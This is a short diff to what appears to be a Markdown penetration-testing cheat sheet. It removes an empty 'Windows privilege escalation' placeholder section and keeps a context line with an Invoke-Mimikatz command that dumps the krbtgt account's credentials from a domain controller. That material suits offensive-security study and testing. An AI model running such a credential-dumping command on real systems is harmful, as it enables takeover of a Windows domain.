@@ -141,10 +141,6 @@
 |Invoke-Mimikatz -Command '"lsadump::lsa /inject /name:krbtgt"'|
 
 
-### Window Common Privilge Escalation
-| for Example  |
-| ------------- |
-|AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA|
 
 
 | Linxu and Microsoft RPC Enumeration  |
